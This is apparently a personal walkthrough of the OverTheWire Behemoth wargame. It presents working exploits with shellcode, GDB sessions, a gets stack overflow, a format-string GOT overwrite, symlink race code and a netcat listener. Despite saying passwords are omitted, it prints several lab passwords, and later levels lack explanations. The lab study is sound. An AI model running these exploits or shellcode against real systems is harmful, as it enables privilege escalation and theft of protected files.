#+TITLE: Over The Wire: Behemoth
#+DATE: May 16, 2022
#+OPTIONS: toc:t num:nil

* About this Document
This document is a light-weight walk-through for solving the wargame
named Behemoth which is provided by "Over The Wire". It consists of
elementary security vulnerabilities on the 32 bit x86 platform. You
can find the wargame [[https://overthewire.org/wargames/behemoth/][here]].

Each level consists of one vulnerable program, that can be exploited
to escalate privileges and capture the password for the next level.

The format of this document is to present the vulnerability followed
by one possible exploit. No attempt is made to explain generic
knowledge such as C, GDB, or how the exploits work.

All passwords are omitted.

* Code & Conventions Used Throughout
The working directories throughout the outline are generated by =cd
$(mktemp -d)=. However, everything is presented in a relative manner.

All passwords are kept in =/etc/behemoth_pass/=.

Two pieces of code will be reused across levels. One being shellcode
and the other being =getenvaddr=. 

** Shellcode
Because we only care about getting the passwords by reading a file
located in =/etc/behemoth_pass/=, we don't care about spawning a shell
(unless we're forced to for some reason). Therefore, our shellcode
executes =/bin/cat= to print the contents of
=/etc/behemoth_pass/behemothX= to standard out. The =X= at the end of
the path is replaced by the appropriate level, which makes this
shellcode easily reusable for any level that calls for it.

*** =shellcode.asm=
#+NAME: shellcode.asm
#+BEGIN_SRC asm -n 1
BITS 32

xor eax, eax    ; Our null byte
push eax

mov edx, esp    ; Save the address of our null byte
push "/cat"
push "/bin"     ; Pushes "/bin/cat\0" on the stack
mov ebx, esp    ; Keep the address of "/bin/cat\0"

push eax        ; push "\0"
push "othX"     ; Change the X to the correct level number
push "ehem"
push "///b"
push "pass"
push "oth_"
push "ehem"
push "///b"
push "/etc"     ; Creates "/etc///behemoth_pass///behemothX\0"
mov ebp, esp    ; Save

push eax        ; NULL
push ebp        ; Pointer to "/etc///behemoth_pass///behemothX\0"
push ebx        ; Pointer to "/bin/cat\0"
mov ecx, esp    ; Pointer to array of strings that's terminated with NULL

mov al, 11      ; execve("/bin/cat", (char*[]) {"/bin/cat", "/etc///behemoth_pass///behemothX", NULL}, (char*[]) {NULL});
int 0x80        
#+END_SRC

*** Compiling
Edit line 12 by replacing =X= with the correct level number. Then use
NASM to assemble the shellcode.

#+BEGIN_EXAMPLE
$ nasm -o shellcode -f bin shellcode.asm
#+END_EXAMPLE

** Environment Variables
The environment variable =EGG= will be used to store shellcode. In
order to get the address of our environment variable, we'll use
=getenvaddr.c=. This code is taken from Jon Erikson's book "Hacking:
The Art of Exploitation".

*** =getenvaddr.c=
#+NAME: getenvaddr.c
#+BEGIN_SRC c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
int main(int argc, char** argv)
{
    const char* ptr = getenv(argv[1]);
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2;
    printf("%x\n", ptr);
    return 0;
}
#+END_SRC

*** Compiling
To compile this, do the following:

#+BEGIN_EXAMPLE
$ gcc -m32 -o getenvaddr getenvaddr.c
#+END_EXAMPLE

* Level 0

** The Vulnerability
When the program is ran, the user is prompted for a password. The user
given password is checked against a hardcoded string. This string is
the password that causes the program to continue it's normal execution
and spawns a shell. Line 48 is where a shell owned by behemoth1 would
be spwaned if the correct password is given.

Line 33 is where the string comparsion happens between the given
password and the correct password. You can see our input string is
stored in =$ebp-0x5d= and the correct password is stored in
=$ebp-1c=. However, it is "encrypted". The function for encrypting and
decrypting the password is =memfrob=.

#+BEGIN_EXAMPLE -n 1
080485b1 <main>:
 80485b1:       55                      push   ebp
 80485b2:       89 e5                   mov    ebp,esp
 80485b4:       53                      push   ebx
 80485b5:       83 ec 5c                sub    esp,0x5c
 80485b8:       c7 45 e4 4f 4b 5e 47    mov    DWORD PTR [ebp-0x1c],0x475e4b4f
 80485bf:       c7 45 e8 53 59 42 45    mov    DWORD PTR [ebp-0x18],0x45425953
 80485c6:       c7 45 ec 58 5e 59 00    mov    DWORD PTR [ebp-0x14],0x595e58
 80485cd:       c7 45 f8 00 87 04 08    mov    DWORD PTR [ebp-0x8],0x8048700
 80485d4:       c7 45 f4 18 87 04 08    mov    DWORD PTR [ebp-0xc],0x8048718
 80485db:       c7 45 f0 2d 87 04 08    mov    DWORD PTR [ebp-0x10],0x804872d
 80485e2:       68 41 87 04 08          push   0x8048741
 80485e7:       e8 14 fe ff ff          call   8048400 <printf@plt>
 80485ec:       83 c4 04                add    esp,0x4
 80485ef:       8d 45 a3                lea    eax,[ebp-0x5d]
 80485f2:       50                      push   eax
 80485f3:       68 4c 87 04 08          push   0x804874c
 80485f8:       e8 73 fe ff ff          call   8048470 <__isoc99_scanf@plt>
 80485fd:       83 c4 08                add    esp,0x8
 8048600:       8d 45 e4                lea    eax,[ebp-0x1c]
 8048603:       50                      push   eax
 8048604:       e8 47 fe ff ff          call   8048450 <strlen@plt>
 8048609:       83 c4 04                add    esp,0x4
 804860c:       50                      push   eax
 804860d:       8d 45 e4                lea    eax,[ebp-0x1c]
 8048610:       50                      push   eax
 8048611:       e8 75 ff ff ff          call   804858b <memfrob>
 8048616:       83 c4 08                add    esp,0x8
 8048619:       8d 45 e4                lea    eax,[ebp-0x1c]
 804861c:       50                      push   eax
 804861d:       8d 45 a3                lea    eax,[ebp-0x5d]
 8048620:       50                      push   eax
 8048621:       e8 ca fd ff ff          call   80483f0 <strcmp@plt>
 8048626:       83 c4 08                add    esp,0x8
 8048629:       85 c0                   test   eax,eax
 804862b:       75 32                   jne    804865f <main+0xae>
 804862d:       68 51 87 04 08          push   0x8048751
 8048632:       e8 e9 fd ff ff          call   8048420 <puts@plt>
 8048637:       83 c4 04                add    esp,0x4
 804863a:       e8 d1 fd ff ff          call   8048410 <geteuid@plt>
 804863f:       89 c3                   mov    ebx,eax
 8048641:       e8 ca fd ff ff          call   8048410 <geteuid@plt>
 8048646:       53                      push   ebx
 8048647:       50                      push   eax
 8048648:       e8 f3 fd ff ff          call   8048440 <setreuid@plt>
 804864d:       83 c4 08                add    esp,0x8
 8048650:       68 62 87 04 08          push   0x8048762
 8048655:       e8 d6 fd ff ff          call   8048430 <system@plt>
 804865a:       83 c4 04                add    esp,0x4
 804865d:       eb 0d                   jmp    804866c <main+0xbb>
 804865f:       68 6a 87 04 08          push   0x804876a
 8048664:       e8 b7 fd ff ff          call   8048420 <puts@plt>
 8048669:       83 c4 04                add    esp,0x4
 804866c:       b8 00 00 00 00          mov    eax,0x0
 8048671:       8b 5d fc                mov    ebx,DWORD PTR [ebp-0x4]
 8048674:       c9                      leave
 8048675:       c3                      ret
#+END_EXAMPLE

** The Exploit
We can open up a debugger and either set a breakpoint at =strcmp= and
look at the decrypted string or we can call =memfrob= on the string
and look at it. We'll do the latter because it's a little more
educational.

There's some initializing on =$ebp-0x1c= happening at the beginning of
=main=. (You can see this above on lines 6 through 11.) Because of
this, we'll set the breakpoint at =printf= and then do our work. Let's
check the length of =$ebp-0x1c= and call =memfrob=.

#+BEGIN_EXAMPLE
$ gdb -q /behemoth/behemoth0
Reading symbols from /behemoth/behemoth0...(no debugging symbols found)...done.
(gdb) b printf
Breakpoint 1 at 0x8048400
(gdb) r
Starting program: /behemoth/behemoth0

Breakpoint 1, 0xf7e5b7d0 in printf () from /lib32/libc.so.6
#+END_EXAMPLE

At this point, the the password string is initialized at =$ebp-0x1c=
but it's encrypted. We can see the encrypted string by doing,

#+BEGIN_EXAMPLE
(gdb) x/s $ebp-0x1c
0xffffd6ac:     "OK^GSYBEX^Y"
#+END_EXAMPLE

Now let's decrypted it by calling =memfrob=. If you look at what's
happening, you'll see that =memfrob= takes 2 arguments; the first
being a pointer to a string and the second being the length of the
string. Therefore, in order to call =memfrob=, we need the length of
=$ebp-0x1c=. We can get this by calling =strlen=.

#+BEGIN_EXAMPLE
(gdb) call strlen($ebp-0x1c)
$1 = 11
(gdb) call memfrob($ebp-0x1c, 11)
$2 = 0
(gdb) x/s $ebp-0x1c
0xffffd6ac:     "eatmyshorts"
(gdb) quit
A debugging session is active.

        Inferior 1 [process 16747] will be killed.

Quit anyway? (y or n) y
#+END_EXAMPLE

Now that we have what we think is the password, we can test it.

#+BEGIN_EXAMPLE
$ /behemoth/behemoth0
Password: eatmyshorts
Access granted..
$ whoami
behemoth1
$
#+END_EXAMPLE

Now we have the correct privilages to read
=/etc/behemoth_pass/behemoth1=.

* Level 1

** The Vulnerability
A classic buffer overflow on the stack.

User input is being written to a buffer on the stack with =gets= that
is 0x43 (67) bytes long. Therefore, this is vulnerable to over writing
the return address of =main=.

#+BEGIN_EXAMPLE
0804844b <main>:
 804844b:       55                      push   ebp
 804844c:       89 e5                   mov    ebp,esp
 804844e:       83 ec 44                sub    esp,0x44
 8048451:       68 00 85 04 08          push   0x8048500
 8048456:       e8 a5 fe ff ff          call   8048300 <printf@plt>
 804845b:       83 c4 04                add    esp,0x4
 804845e:       8d 45 bd                lea    eax,[ebp-0x43]
 8048461:       50                      push   eax
 8048462:       e8 a9 fe ff ff          call   8048310 <gets@plt>
 8048467:       83 c4 04                add    esp,0x4
 804846a:       68 0c 85 04 08          push   0x804850c
 804846f:       e8 ac fe ff ff          call   8048320 <puts@plt>
 8048474:       83 c4 04                add    esp,0x4
 8048477:       b8 00 00 00 00          mov    eax,0x0
 804847c:       c9                      leave
 804847d:       c3                      ret
#+END_EXAMPLE

** The Exploit
We'll put our shellcode in =$EGG= and overwrite the return address from
=main= to point to =$EGG=.

#+BEGIN_EXAMPLE
$ export EGG=$(cat shellcode)
$ ./getenvaddr EGG /behemoth/behemoth1
ffffda2d
#+END_EXAMPLE

Because the x86 architecture is little endian, we have to put the
bytes in the correct order. The low-order byte goes first and the
high-order byte last.

#+BEGIN_EXAMPLE
$ printf "%s\x2d\xda\xff\xff" $(python -c "print('A' * 71)") | /behemoth/behemoth1
Password: Authentication failure.
Sorry.
XXXXXXXXXX
$
#+END_EXAMPLE

The shellcode displays the contents of
=/etc/behemoth_pass/behemoth2=, which I have censored here.

* Level 2

** The Vulnerability
This awkward program has a vulnerable race condition. It tries to
create a file who's filename is the PID of the process creating
it. Then the program sleeps for 33.3 minutes. When it wakes up, it
prints out the contents of the file it created.

Therefore, if we can replace the created file with a symbolic link
that points to =/etc/behemoth_pass/behemoth3=, then we can possibly
captured the password.

#+BEGIN_EXAMPLE -n 1
0804856b <main>:
 804856b:       8d 4c 24 04             lea    ecx,[esp+0x4]
 804856f:       83 e4 f0                and    esp,0xfffffff0
 8048572:       ff 71 fc                push   DWORD PTR [ecx-0x4]
 8048575:       55                      push   ebp
 8048576:       89 e5                   mov    ebp,esp
 8048578:       53                      push   ebx
 8048579:       51                      push   ecx
 804857a:       83 c4 80                add    esp,0xffffff80
 804857d:       e8 7e fe ff ff          call   8048400 <getpid@plt>
 8048582:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
 8048585:       8d 45 dc                lea    eax,[ebp-0x24]
 8048588:       83 c0 06                add    eax,0x6
 804858b:       89 45 f0                mov    DWORD PTR [ebp-0x10],eax
 804858e:       83 ec 04                sub    esp,0x4
 8048591:       ff 75 f4                push   DWORD PTR [ebp-0xc]
 8048594:       68 10 87 04 08          push   0x8048710
 8048599:       8d 45 dc                lea    eax,[ebp-0x24]
 804859c:       50                      push   eax
 804859d:       e8 9e fe ff ff          call   8048440 <sprintf@plt>
 80485a2:       83 c4 10                add    esp,0x10
 80485a5:       83 ec 08                sub    esp,0x8
 80485a8:       8d 85 78 ff ff ff       lea    eax,[ebp-0x88]
 80485ae:       50                      push   eax
 80485af:       ff 75 f0                push   DWORD PTR [ebp-0x10]
 80485b2:       e8 19 01 00 00          call   80486d0 <__lstat>
 80485b7:       83 c4 10                add    esp,0x10
 80485ba:       25 00 f0 00 00          and    eax,0xf000
 80485bf:       3d 00 80 00 00          cmp    eax,0x8000
 80485c4:       74 36                   je     80485fc <main+0x91>
 80485c6:       83 ec 0c                sub    esp,0xc
 80485c9:       ff 75 f0                push   DWORD PTR [ebp-0x10]
 80485cc:       e8 1f fe ff ff          call   80483f0 <unlink@plt>
 80485d1:       83 c4 10                add    esp,0x10
 80485d4:       e8 07 fe ff ff          call   80483e0 <geteuid@plt>
 80485d9:       89 c3                   mov    ebx,eax
 80485db:       e8 00 fe ff ff          call   80483e0 <geteuid@plt>
 80485e0:       83 ec 08                sub    esp,0x8
 80485e3:       53                      push   ebx
 80485e4:       50                      push   eax
 80485e5:       e8 36 fe ff ff          call   8048420 <setreuid@plt>
 80485ea:       83 c4 10                add    esp,0x10
 80485ed:       83 ec 0c                sub    esp,0xc
 80485f0:       8d 45 dc                lea    eax,[ebp-0x24]
 80485f3:       50                      push   eax
 80485f4:       e8 17 fe ff ff          call   8048410 <system@plt>
 80485f9:       83 c4 10                add    esp,0x10
 80485fc:       83 ec 0c                sub    esp,0xc
 80485ff:       68 d0 07 00 00          push   0x7d0
 8048604:       e8 c7 fd ff ff          call   80483d0 <sleep@plt>
 8048609:       83 c4 10                add    esp,0x10
 804860c:       8d 45 dc                lea    eax,[ebp-0x24]
 804860f:       c7 00 63 61 74 20       mov    DWORD PTR [eax],0x20746163
 8048615:       c6 40 04 00             mov    BYTE PTR [eax+0x4],0x0
 8048619:       c6 45 e0 20             mov    BYTE PTR [ebp-0x20],0x20
 804861d:       e8 be fd ff ff          call   80483e0 <geteuid@plt>
 8048622:       89 c3                   mov    ebx,eax
 8048624:       e8 b7 fd ff ff          call   80483e0 <geteuid@plt>
 8048629:       83 ec 08                sub    esp,0x8
 804862c:       53                      push   ebx
 804862d:       50                      push   eax
 804862e:       e8 ed fd ff ff          call   8048420 <setreuid@plt>
 8048633:       83 c4 10                add    esp,0x10
 8048636:       83 ec 0c                sub    esp,0xc
 8048639:       8d 45 dc                lea    eax,[ebp-0x24]
 804863c:       50                      push   eax
 804863d:       e8 ce fd ff ff          call   8048410 <system@plt>
 8048642:       83 c4 10                add    esp,0x10
 8048645:       b8 00 00 00 00          mov    eax,0x0
 804864a:       8d 65 f8                lea    esp,[ebp-0x8]
 804864d:       59                      pop    ecx
 804864e:       5b                      pop    ebx
 804864f:       5d                      pop    ebp
 8048650:       8d 61 fc                lea    esp,[ecx-0x4]
 8048653:       c3                      ret
#+END_EXAMPLE

** The Exploit

Because the process is running as behemoth3, we need to ensure the
process has permission to write to the directories and files we
need. To accomplish this, we'll make a new directory and give it 777
permissions. Then we'll make a file called =pass.txt= and give it the
same permissions.

#+BEGIN_EXAMPLE
$ mkdir w
$ chmod 777
$ cd w
$ touch pass.txt
$ chmod 777 pass.txt
#+END_EXAMPLE

This hack will take 33.3 minutes to complete. Because we don't want to
sit here watching for a password to pop up, we'll run the process in
the background and pipe the output to =pass.txt=. After we start the
process, we'll know the PID and hence know the filename we need to
overwrite with a symbolic link.

#+BEGIN_EXAMPLE
$ behemoth/behemoth2 > pass.txt &
[1] 29355
$ ln -sf /etc/behemoth_pass/behemoth3 29355
#+END_EXAMPLE

We can run the following shell script snippet to sound the bell when the
process has ended.

#+BEGIN_EXAMPLE
$ while (2>&1 kill -0 29355 | grep permitted > /dev/null); do
> echo "Process still running..."
> sleep 5
> done; \
> echo -ne '\007'; \ # Ring the bell
> cat pass.txt
#+END_EXAMPLE

* Level 3
** The Vulnerability
This level has a format string vulnerability. The user is prompted for
input and that input is passed directly to =printf=. Therefore, a user
can inject formatting syntax that =printf= understands.

This can be used to overwrite parts of memory using the =%n=
specificer; which implies we can overwrite a return address, parts of
the =.plt= section or something else we choose.

Looking at the dissasembly of =main=, we see =puts= is called at
address =0x80484cc=.

#+BEGIN_EXAMPLE
0804847b <main>:
 804847b:       55                      push   ebp
 804847c:       89 e5                   mov    ebp,esp
 804847e:       81 ec c8 00 00 00       sub    esp,0xc8
 8048484:       68 60 85 04 08          push   0x8048560
 8048489:       e8 a2 fe ff ff          call   8048330 <printf@plt>
 804848e:       83 c4 04                add    esp,0x4
 8048491:       a1 c0 97 04 08          mov    eax,ds:0x80497c0
 8048496:       50                      push   eax
 8048497:       68 c8 00 00 00          push   0xc8
 804849c:       8d 85 38 ff ff ff       lea    eax,[ebp-0xc8]
 80484a2:       50                      push   eax
 80484a3:       e8 98 fe ff ff          call   8048340 <fgets@plt>
 80484a8:       83 c4 0c                add    esp,0xc
 80484ab:       68 74 85 04 08          push   0x8048574
 80484b0:       e8 7b fe ff ff          call   8048330 <printf@plt>
 80484b5:       83 c4 04                add    esp,0x4
 80484b8:       8d 85 38 ff ff ff       lea    eax,[ebp-0xc8]
 80484be:       50                      push   eax
 80484bf:       e8 6c fe ff ff          call   8048330 <printf@plt>
 80484c4:       83 c4 04                add    esp,0x4
 80484c7:       68 7e 85 04 08          push   0x804857e
 80484cc:       e8 7f fe ff ff          call   8048350 <puts@plt>
 80484d1:       83 c4 04                add    esp,0x4
 80484d4:       b8 00 00 00 00          mov    eax,0x0
 80484d9:       c9                      leave  
 80484da:       c3                      ret
 #+END_EXAMPLE

Because the program is calling =puts= from a dynamically loaded
library, it needs to know how to find the address where =puts=
resides. This information is supplied by the =.plt= section.

 #+BEGIN_EXAMPLE
 08048350 <puts@plt>:
 8048350:       ff 25 ac 97 04 08       jmp    DWORD PTR ds:0x80497ac
 8048356:       68 10 00 00 00          push   0x10
 804835b:       e9 c0 ff ff ff          jmp    8048320 <.plt>
 #+END_EXAMPLE

 We can see from the above diassembly that the pointer to =puts= is
 =0x80497ac=.
 
** The Exploit

Let's first prepare our shellcode.

#+BEGIN_EXAMPLE
$ export EGG=$(cat shellcode)
$ ./getenvaddr EGG /behemoth/behemoth3
ffffde2d
#+END_EXAMPLE

From the =.plt= section, we know the pointer for =puts= is
=0x80497ac=. We'll overwrite the value in two steps. First overwriting
2 bytes at =0x80497ac=. Then overwriting 2 bytes at =0x80497ae=. The
order matters. The =%n= specifier writes 4 bytes (an unsigned int) and
we don't want to overwrite the upper 2 bytes of our address when
writing the lower two bytes.

Our string for =printf= will conceptually consist of two parts. The
first is ="\xac\x97\x04\x08\xae\x97\x04\x08"= which will act as
pointers for =%n=. The second part will have this structure
="%c%1$n%c%2$n"=. We just have to figure out how many chars to print
so that =%n= will write the correct value.

If we use the strings above as they are, the lower 2 bytes would be
written with 0x09 and the upper 2 bytes would be 0x0a. We need the
lower 2 bytes to be 0xde2d. Therefore, we need to write 56869 (0xde25)
more characters and then 8658 (0x21d2) more characters for the last 2
bytes.

The final result looks like this:

#+BEGIN_EXAMPLE
$ printf '\xac\x97\x04\x08\xae\x97\x04\x08%%56869c%%1$n%%8658c%%2$n' | /behemoth/behemoth3

XXXXXXXXXX
#+END_EXAMPLE

* Level 4

** The Vulnerability

** The Exploit

#+BEGIN_SRC
#include <stdio.h>
#include <unistd.h>

int main() {
    int pid = fork();
    char file[] = "/tmp/XXXXXXXXXXXXXXXX";

    if (pid == 0) {
        printf("Child is sleeping...\n");
        sleep(5);
        printf("Child woke up!\n");
        printf("Executing behemoth4");
        execl("/behemoth/behemoth4", "behemoth4", NULL);
    } else {
        sprintf(file + sizeof("/tmp/") - 1, "%d", pid);
        printf("Making symlink: %s -> /etc/behemoth_pass/behemoth5\n", file);
        symlink("/etc/behemoth_pass/behemoth5", file);
    }

    return 0;
}
#+END_SRC

* Level 5
** The Vulnerability

** The Exploit

#+BEGIN_EXAMPLE
behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ nc -u -l -p 1337 > pass &
[2] 3099
behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ /behemoth/behemoth5
behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ ls
pass
behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ cat pass
mayiroeche

[2]+  Stopped                 nc -u -l -p 1337 > pass
behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$
behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$
#+END_EXAMPLE

* Level 6

** The Vulnerability

** The Exploit

#+NAME: shellcode6.asm
#+BEGIN_SRC asm -n 1
BITS 32

%define PUTS [0x804a020]

push ebp
mov ebp,esp

xor eax, eax
push eax
push "itty"
push "lloK"
push "xxHe"
inc esp
inc esp
push esp
call PUTS

mov esp, ebp
pop ebp
ret
#+END_SRC

#+BEGIN_EXAMPLE
behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX$ mkdir w
behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX$ chmod 777 w
behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX$ cd w
behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX/w$ nasm -o shellcode.txt ../shellcode.asm
behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX/w$ /behemoth/behemoth6
Correct.
$ cat /etc/behemoth_pass/behemoth7
baquoxuafo
$
#+END_EXAMPLE

* Level 7

** The Vulnerability

** The Exploit

#+BEGIN_EXAMPLE
$ $(python3 -c 'print("A" * 528, end="")'; printf "\xe0\xd4\xff\xff") $(cat shellcode.bin)
#+END_EXAMPLE

